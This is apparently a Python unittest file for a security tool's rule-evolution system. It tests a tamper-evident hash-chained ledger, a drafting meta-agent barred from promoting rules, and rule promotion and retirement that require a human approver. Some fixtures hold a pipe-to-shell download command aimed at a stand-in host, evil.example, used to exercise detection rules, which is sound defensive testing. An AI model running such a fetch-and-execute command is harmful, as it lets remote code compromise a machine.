# -*- coding: utf-8 -*-
"""RSES（规则自进化）测试：哈希链账本 + 有界元 agent + 晋升/退役接线。

钉死的三件事
------------
1. **账本不可被静默篡改**：改历史字段 / 删行 / 调序 / 插坏行，verify_chain()
   都在第一个断点报出来。审计账本里"看起来没问题"比"有问题"危险得多。
2. **特权动作必须带批准人，元 agent 永远无权晋升**：promote/demote/rollback
   缺 approved_by 即 ValueError；actor 为 meta: 前缀一律拒。元 agent 侧再用
   `hasattr` 结构性钉死"没有晋升方法"——双保险，任一失效另一仍成立。
3. **自触发须为 0**：草稿 pattern 在留存集或自有仓库 shipped 面上任一命中即
   判 rejected。负控语料取不到时 fail-closed，绝不静默放行。

真实 I/O 只用读路径（默认自有仓库扫描），所有写全部落在临时目录。
"""

import json
import os
import shutil
import sys
import tempfile
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
sys.path.insert(0, os.path.join(ROOT, "scripts"))

from eco import evolution_ledger  # noqa: E402
from eco import meta_agent  # noqa: E402

import promote_rule  # noqa: E402
import rule_decay  # noqa: E402


def _read_lines(path):
    if not os.path.exists(path):
        return []
    with open(path, encoding="utf-8") as f:
        return [l for l in f.read().splitlines() if l.strip()]


class _LedgerEnv(unittest.TestCase):
    """把账本路径关进临时目录，绝不碰仓库真实数据。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aishield_evo_")
        self.ledger = os.path.join(self.tmp, "state", "evolution_ledger.jsonl")
        self._saved = evolution_ledger.LEDGER_FILE
        evolution_ledger.LEDGER_FILE = self.ledger

    def tearDown(self):
        evolution_ledger.LEDGER_FILE = self._saved
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _entries(self):
        return evolution_ledger.list_entries(self.ledger)

    def _rewrite_line(self, index, obj):
        lines = _read_lines(self.ledger)
        lines[index] = json.dumps(obj, ensure_ascii=False)
        with open(self.ledger, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")


class TestHashChain(_LedgerEnv):

    def test_records_form_a_linked_chain(self):
        e1 = evolution_ledger.record(actor="alice", action="draft", target="d1")
        e2 = evolution_ledger.record(actor="alice", action="test", target="d1")
        e3 = evolution_ledger.record(actor="bob", action="promote", target="d1",
                                     approved_by="bob")
        entries = self._entries()
        self.assertEqual([e["seq"] for e in entries], [1, 2, 3])
        self.assertEqual(entries[1]["prev_hash"], entries[0]["hash"])
        self.assertEqual(entries[2]["prev_hash"], entries[1]["hash"])
        self.assertEqual(entries[0]["prev_hash"], evolution_ledger.GENESIS_HASH)
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertTrue(res["ok"], res)
        self.assertEqual(res["head"], e3["hash"])

    def test_verify_missing_file_is_empty_ok(self):
        res = evolution_ledger.verify_chain(os.path.join(self.tmp, "nope.jsonl"))
        self.assertTrue(res["ok"])
        self.assertEqual(res["entries"], 0)

    def test_tampered_field_breaks_the_chain(self):
        evolution_ledger.record(actor="alice", action="draft", target="d1")
        e2 = evolution_ledger.record(actor="alice", action="test", target="d1")
        evolution_ledger.record(actor="bob", action="promote", target="d1",
                                approved_by="bob")
        tampered = dict(e2)
        tampered["rationale"] = "nothing to see here"
        self._rewrite_line(1, tampered)
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])
        self.assertEqual(res["broken_at"], 2)
        self.assertIn("tampered", res["reason"])

    def test_tampered_prev_hash_breaks_the_chain(self):
        evolution_ledger.record(actor="alice", action="draft", target="d1")
        e2 = evolution_ledger.record(actor="alice", action="test", target="d1")
        tampered = dict(e2)
        tampered["prev_hash"] = "f" * 64
        self._rewrite_line(1, tampered)
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])
        self.assertEqual(res["broken_at"], 2)
        self.assertIn("prev_hash", res["reason"])

    def test_deleted_line_breaks_the_chain(self):
        for i in range(3):
            evolution_ledger.record(actor="alice", action="draft",
                                    target="d%d" % i)
        lines = _read_lines(self.ledger)
        del lines[1]
        with open(self.ledger, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])
        self.assertIsNotNone(res["broken_at"])

    def test_reordered_entries_break_the_chain(self):
        for i in range(3):
            evolution_ledger.record(actor="alice", action="draft",
                                    target="d%d" % i)
        lines = _read_lines(self.ledger)
        lines[0], lines[1] = lines[1], lines[0]
        with open(self.ledger, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])

    def test_corrupt_line_is_reported_not_swallowed(self):
        evolution_ledger.record(actor="alice", action="draft", target="d1")
        with open(self.ledger, "a", encoding="utf-8") as f:
            f.write("{ this is not json\n")
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])
        self.assertEqual(res["broken_at"], 2)
        self.assertIn("not valid JSON", res["reason"])

    def test_record_after_a_break_still_detects_the_first_break(self):
        """追加不掩盖断点：断链后继续写，第一个断点仍指向第一现场。"""
        for i in range(3):
            evolution_ledger.record(actor="alice", action="draft",
                                    target="d%d" % i)
        e2 = self._entries()[1]
        tampered = dict(e2)
        tampered["rationale"] = "rewritten"
        self._rewrite_line(1, tampered)
        evolution_ledger.record(actor="alice", action="test", target="d0")
        res = evolution_ledger.verify_chain(self.ledger)
        self.assertFalse(res["ok"])
        self.assertEqual(res["broken_at"], 2, "断点必须仍是被改的那一条")

    def test_invalid_inputs_are_rejected(self):
        with self.assertRaises(ValueError):
            evolution_ledger.record(actor="a", action="teleport", target="t")
        with self.assertRaises(ValueError):
            evolution_ledger.record(actor="", action="draft", target="t")
        with self.assertRaises(ValueError):
            evolution_ledger.record(actor="a", action="draft", target="  ")
        with self.assertRaises(ValueError):
            evolution_ledger.record(actor="a", action="draft", target="t",
                                    evidence=["not", "a", "dict"])


class TestPrivilegedActions(_LedgerEnv):

    def test_promote_requires_approved_by(self):
        with self.assertRaises(ValueError) as ctx:
            evolution_ledger.record(actor="alice", action="promote",
                                    target="cand.json")
        self.assertIn("approved_by", str(ctx.exception))

    def test_demote_and_rollback_require_approved_by(self):
        for action in ("demote", "rollback"):
            with self.assertRaises(ValueError):
                evolution_ledger.record(actor="alice", action=action,
                                        target="data/radar_rules.json")

    def test_meta_agent_cannot_promote_even_with_an_approver(self):
        with self.assertRaises(ValueError) as ctx:
            evolution_ledger.record(actor="meta:rses-drafter-v1",
                                    action="promote", target="cand.json",
                                    approved_by="a-human")
        self.assertIn("never promote", str(ctx.exception))
        # 账本必须一个字都没写
        self.assertEqual(self._entries(), [])

    def test_meta_agent_cannot_demote_or_rollback(self):
        for action in ("demote", "rollback"):
            with self.assertRaises(ValueError):
                evolution_ledger.record(actor="meta:anything", action=action,
                                        target="x", approved_by="a-human")

    def test_human_promote_with_approver_is_recorded(self):
        e = evolution_ledger.record(actor="alice", action="promote",
                                    target="cand.json", approved_by="alice",
                                    evidence={"patterns": ["p"]})
        self.assertEqual(e["approved_by"], "alice")
        self.assertEqual(e["evidence"], {"patterns": ["p"]})
        self.assertTrue(evolution_ledger.verify_chain(self.ledger)["ok"])

    def test_meta_actor_may_draft_test_and_reflect(self):
        for action in ("draft", "test", "reflect"):
            evolution_ledger.record(actor="meta:rses-drafter-v1",
                                    action=action, target="cand.json")
        self.assertEqual(len(self._entries()), 3)

    def test_summary_aggregates_and_verifies(self):
        evolution_ledger.record(actor="alice", action="draft", target="d")
        evolution_ledger.record(actor="meta:x", action="test", target="d")
        s = evolution_ledger.summary(self.ledger)
        self.assertEqual(s["entries"], 2)
        self.assertEqual(s["by_action"], {"draft": 1, "test": 1})
        self.assertEqual(s["by_actor"]["meta:x"], 1)
        self.assertTrue(s["verified"])

    def test_cli_verify_and_record(self):
        rc = evolution_ledger.main(["--path", self.ledger, "--verify"])
        self.assertEqual(rc, 0)
        # 元 agent 走 CLI 晋升同样被拒（账本层兜底，不依赖调用方自觉）
        rc = evolution_ledger.main(["--path", self.ledger, "--record",
                                    "--action", "promote", "--target", "c.json",
                                    "--actor", "meta:x",
                                    "--approved-by", "a-human"])
        self.assertEqual(rc, 2)
        rc = evolution_ledger.main(["--path", self.ledger, "--record",
                                    "--action", "promote", "--target", "c.json",
                                    "--actor", "alice",
                                    "--approved-by", "alice"])
        self.assertEqual(rc, 0)
        rc = evolution_ledger.main(["--path", self.ledger, "--verify"])
        self.assertEqual(rc, 0)


class _MetaAgentEnv(unittest.TestCase):
    """元 agent 全注入环境：临时候选目录 + 临时账本 + 假扫描器/假语料。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aishield_meta_")
        self.ledger = os.path.join(self.tmp, "evolution_ledger.jsonl")
        self.proposals = os.path.join(self.tmp, "_proposed")
        self.self_hits = []
        self.benign = []
        self.attack = []
        self.known = set()

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _agent(self):
        return meta_agent.DraftingMetaAgent(
            proposals_dir=self.proposals,
            ledger_path=self.ledger,
            self_scan_fn=lambda pattern: list(self.self_hits),
            corpus_fn=lambda: (list(self.benign), list(self.attack)),
            known_patterns_fn=lambda: (set(self.known), True))

    def _propose(self, agent, pattern="curl\\s+https?://evil\\.example/p", **kw):
        params = dict(
            signal_id="SIG-1", signal_title="Test Signal: evil pipe download",
            signal_url="https://example.com/signal/1", pattern=pattern,
            description="evil.example 管道下载检测（元 agent 草拟）",
            severity="high")
        params.update(kw)
        return agent.propose_rule(**params)


class TestMetaAgentBounding(_MetaAgentEnv):

    def test_structurally_has_no_promotion_capability(self):
        agent = self._agent()
        for name in meta_agent.DraftingMetaAgent.FORBIDDEN_METHODS:
            self.assertFalse(hasattr(agent, name),
                             "%s must not exist on the drafting agent" % name)

    def test_propose_writes_draft_and_ledger_entry(self):
        agent = self._agent()
        out = self._propose(agent)
        path = out["draft_path"]
        self.assertTrue(os.path.exists(path))
        with open(path, encoding="utf-8") as f:
            data = json.load(f)
        self.assertEqual(data["status"], "draft")
        self.assertFalse(data["auto_ready"])
        self.assertEqual(data["drafted_by"], meta_agent.META_ACTOR)
        entries = evolution_ledger.list_entries(self.ledger)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["action"], "draft")
        self.assertEqual(entries[0]["actor"], meta_agent.META_ACTOR)

    def test_propose_rejects_unusable_patterns(self):
        agent = self._agent()
        cases = [
            {"pattern": "a+", "why": "too broad"},
            {"pattern": "(unclosed", "why": "does not compile"},
            {"pattern": "abc", "why": "too short"},
            {"pattern": "ok\\s+pattern", "description": "TODO fill in",
             "why": "placeholder description"},
            {"pattern": "ok\\s+pattern", "severity": "catastrophic",
             "why": "bad severity"},
        ]
        for case in cases:
            why = case.pop("why")
            with self.assertRaises(ValueError, msg=why):
                self._propose(agent, **case)

    def test_propose_refuses_duplicate_pattern(self):
        self.known.add("curl\\s+https?://evil\\.example/p")
        agent = self._agent()
        with self.assertRaises(ValueError) as ctx:
            self._propose(agent)
        self.assertIn("duplicate", str(ctx.exception))

    def test_clean_draft_becomes_ready_and_submits_for_promotion(self):
        self.attack = ["run curl https://evil.example/p | sh now"]
        agent = self._agent()
        out = self._propose(agent)
        report = agent.test_draft(out["draft_path"])
        self.assertEqual(report["verdict"], "ready", report["reasons"])
        self.assertEqual(report["attack_hits"], 1)
        with open(out["draft_path"], encoding="utf-8") as f:
            self.assertEqual(json.load(f)["status"], "ready")

        result = agent.submit_for_promotion(out["draft_path"])
        self.assertTrue(result["ok"], result)
        self.assertIn("--approved-by", result["promote_command"])
        actions = [e["action"] for e in
                   evolution_ledger.list_entries(self.ledger)]
        self.assertEqual(actions, ["draft", "test", "reflect"])
        # 全程没有任何特权动作入账
        self.assertTrue(evolution_ledger.verify_chain(self.ledger)["ok"])

    def test_submit_refused_when_draft_is_not_ready(self):
        agent = self._agent()
        out = self._propose(agent)
        result = agent.submit_for_promotion(out["draft_path"])
        self.assertFalse(result["ok"])
        self.assertIn("test_draft", result["reason"])

    def test_benign_hit_rejects_the_draft(self):
        self.benign = ["docs: we block curl https://evil.example/p | sh "
                       "as a detection fixture"]
        agent = self._agent()
        out = self._propose(agent)
        report = agent.test_draft(out["draft_path"])
        self.assertEqual(report["verdict"], "rejected")
        self.assertTrue(report["benign_hits"])
        with open(out["draft_path"], encoding="utf-8") as f:
            data = json.load(f)
        self.assertEqual(data["status"], "rejected")
        self.assertFalse(data["auto_ready"])
        self.assertIn("meta-agent self-test rejected", data["review_notes"])

    def test_self_trigger_rejects_the_draft(self):
        self.self_hits = [{"path": "docs/README.md",
                           "match": "curl https://evil.example/p"}]
        agent = self._agent()
        out = self._propose(agent)
        report = agent.test_draft(out["draft_path"])
        self.assertEqual(report["verdict"], "rejected")
        self.assertEqual(len(report["self_hits"]), 1)
        self.assertTrue(any("self-trigger" in r for r in report["reasons"]))

    def test_missing_negative_control_fails_closed(self):
        agent = meta_agent.DraftingMetaAgent(
            proposals_dir=self.proposals, ledger_path=self.ledger,
            self_scan_fn=lambda pattern: [],
            corpus_fn=lambda: (None, None),
            known_patterns_fn=lambda: (set(), True))
        out = self._propose(agent)
        report = agent.test_draft(out["draft_path"])
        self.assertEqual(report["verdict"], "rejected")
        self.assertTrue(any("negative control" in r for r in report["reasons"]))

    def test_uncompilable_pattern_in_draft_is_rejected_by_test(self):
        agent = self._agent()
        path = os.path.join(self.proposals, "PROPOSED_broken.json")
        os.makedirs(self.proposals, exist_ok=True)
        with open(path, "w", encoding="utf-8") as f:
            json.dump({"status": "draft",
                       "rules": [{"pattern": "(unclosed", "description": "d",
                                  "severity": "high"}]}, f)
        report = agent.test_draft(path)
        self.assertEqual(report["verdict"], "rejected")
        self.assertTrue(any("does not compile" in r for r in report["reasons"]))

    def test_default_self_scan_uses_the_real_repo(self):
        """默认自扫描打真实仓库：命中 shipped 面、且绝不打豁免目录。"""
        hits = meta_agent._default_self_scan("AIShield")
        self.assertTrue(hits, "本仓 docs/README 必然含 AIShield —— 扫描器是死的？")
        for h in hits:
            self.assertFalse(h["path"].startswith(("tests/", "data/",
                                                   "scanner/", "scripts/")),
                             "豁免目录不该出现在命中里: %s" % h["path"])
        self.assertEqual(meta_agent._default_self_scan("zzq9x-no-such-token-7f3a"),
                         [])


class TestPromoteRuleLedgerWiring(unittest.TestCase):
    """promote_rule.py 的 enforce 路径必须真的往进化账本记账。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aishield_pr_")
        self._saved = {}
        for attr in ("RADAR_RULES", "SNAPSHOT_DIR", "LEDGER", "PROPOSED_DIR",
                     "EVOLUTION_LEDGER"):
            self._saved[attr] = getattr(promote_rule, attr)
        promote_rule.RADAR_RULES = os.path.join(self.tmp, "data",
                                                "radar_rules.json")
        promote_rule.SNAPSHOT_DIR = os.path.join(self.tmp, "data", "snapshots")
        promote_rule.LEDGER = os.path.join(self.tmp, "data", "state",
                                           "ledger.jsonl")
        promote_rule.PROPOSED_DIR = self.tmp
        promote_rule.EVOLUTION_LEDGER = os.path.join(
            self.tmp, "data", "state", "evolution_ledger.jsonl")
        self._saved["sync_readme_counts"] = promote_rule.sync_readme_counts
        promote_rule.sync_readme_counts = lambda: False
        self._saved["_evaluate_effect"] = promote_rule._evaluate_effect
        promote_rule._evaluate_effect = lambda: None

    def tearDown(self):
        for attr, val in self._saved.items():
            setattr(promote_rule, attr, val)
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _candidate(self, name="cand.json"):
        path = os.path.join(self.tmp, "PROPOSED_%s" % name)
        with open(path, "w", encoding="utf-8") as f:
            json.dump({
                "status": "ready",
                "signal": {"title": "t", "url": "https://example.com/x",
                           "source": "s"},
                "attack_category": "test-cat",
                "rules": [{"pattern": "evil\\s*payload", "description": "d",
                           "severity": "high"}],
            }, f)
        return path

    def test_promote_without_approver_raises(self):
        path = self._candidate()
        with self.assertRaises(ValueError):
            promote_rule.promote(path, json.load(open(path, encoding="utf-8")))
        self.assertFalse(os.path.exists(promote_rule.EVOLUTION_LEDGER))
        self.assertTrue(os.path.exists(path), "被拒后候选不得被归档")

    def test_promote_with_approver_records_the_chain(self):
        path = self._candidate()
        n = promote_rule.promote(path, json.load(open(path, encoding="utf-8")),
                                 approved_by="alice")
        self.assertEqual(n, 1)
        entries = evolution_ledger.list_entries(promote_rule.EVOLUTION_LEDGER)
        self.assertEqual(len(entries), 1)
        e = entries[0]
        self.assertEqual(e["action"], "promote")
        self.assertEqual(e["actor"], "human:alice")
        self.assertEqual(e["approved_by"], "alice")
        self.assertIn("evil\\s*payload", e["evidence"]["patterns"])
        self.assertTrue(evolution_ledger.verify_chain(
            promote_rule.EVOLUTION_LEDGER)["ok"])

    def test_rollback_without_approver_raises(self):
        with self.assertRaises(ValueError):
            promote_rule.rollback()

    def test_rollback_with_approver_records_the_chain(self):
        # 先有一个晋升前状态，快照才会生成（snapshot_current 的契约）
        os.makedirs(os.path.dirname(promote_rule.RADAR_RULES), exist_ok=True)
        with open(promote_rule.RADAR_RULES, "w", encoding="utf-8") as f:
            json.dump({"version": 1, "rules": {r"base\s*rule": ["d", "high"]},
                       "provenance": {}}, f)
        path = self._candidate()
        promote_rule.promote(path, json.load(open(path, encoding="utf-8")),
                             approved_by="alice")
        code, _ = promote_rule.rollback(approved_by="bob")
        self.assertEqual(code, 0)
        actions = [e["action"] for e in
                   evolution_ledger.list_entries(promote_rule.EVOLUTION_LEDGER)]
        self.assertEqual(actions, ["promote", "rollback"])

    def test_cmd_promote_all_refuses_without_approver(self):
        self._candidate()
        code = promote_rule.cmd_promote_all(strict=False)
        self.assertEqual(code, 2)
        self.assertFalse(os.path.exists(promote_rule.RADAR_RULES),
                         "无批准人时一个字节的规则库都不许写")

    def test_cmd_promote_all_with_approver_promotes_and_records(self):
        self._candidate()
        code = promote_rule.cmd_promote_all(strict=False,
                                            approved_by="carol")
        self.assertEqual(code, 0)
        with open(promote_rule.RADAR_RULES, encoding="utf-8") as f:
            self.assertIn("evil\\s*payload", json.load(f)["rules"])
        entries = evolution_ledger.list_entries(promote_rule.EVOLUTION_LEDGER)
        self.assertEqual([e["actor"] for e in entries], ["human:carol"])


class TestRuleDecayRetireWiring(unittest.TestCase):
    """rule_decay.py --retire（demote）同样受账本准入门槛约束。"""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="aishield_decay_")
        self._saved = {a: getattr(rule_decay, a) for a in
                       ("RADAR_RULES", "EVOLUTION_LEDGER")}
        rule_decay.RADAR_RULES = os.path.join(self.tmp, "radar_rules.json")
        rule_decay.EVOLUTION_LEDGER = os.path.join(self.tmp,
                                                   "evolution_ledger.jsonl")
        self.pattern = "dead\\s*rule\\s*pattern"
        with open(rule_decay.RADAR_RULES, "w", encoding="utf-8") as f:
            json.dump({"version": 1,
                       "rules": {self.pattern: ["d", "high"]},
                       "provenance": {}}, f)
        self.state = {"rules": {rule_decay._pattern_hash(self.pattern):
                                {"status": "retire_suggested",
                                 "pattern_prefix": self.pattern}},
                      "summary": {"retire_suggested": 1}}

    def tearDown(self):
        for attr, val in self._saved.items():
            setattr(rule_decay, attr, val)
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_retire_without_approver_raises_and_keeps_rules(self):
        with self.assertRaises(ValueError):
            rule_decay.retire_rules_from_source(self.state)
        with open(rule_decay.RADAR_RULES, encoding="utf-8") as f:
            self.assertIn(self.pattern, json.load(f)["rules"])

    def test_retire_with_approver_removes_and_records(self):
        removed = rule_decay.retire_rules_from_source(
            self.state, approved_by="dave")
        self.assertEqual(removed, 1)
        with open(rule_decay.RADAR_RULES, encoding="utf-8") as f:
            self.assertNotIn(self.pattern, json.load(f)["rules"])
        entries = evolution_ledger.list_entries(rule_decay.EVOLUTION_LEDGER)
        self.assertEqual(len(entries), 1)
        self.assertEqual(entries[0]["action"], "demote")
        self.assertEqual(entries[0]["actor"], "human:dave")
        self.assertEqual(entries[0]["evidence"]["removed_patterns"],
                         [self.pattern])

    def test_retire_with_nothing_to_do_needs_no_approver(self):
        empty = {"rules": {}, "summary": {"retire_suggested": 0}}
        self.assertEqual(rule_decay.retire_rules_from_source(empty), 0)
        self.assertFalse(os.path.exists(rule_decay.EVOLUTION_LEDGER))


if __name__ == "__main__":
    unittest.main()
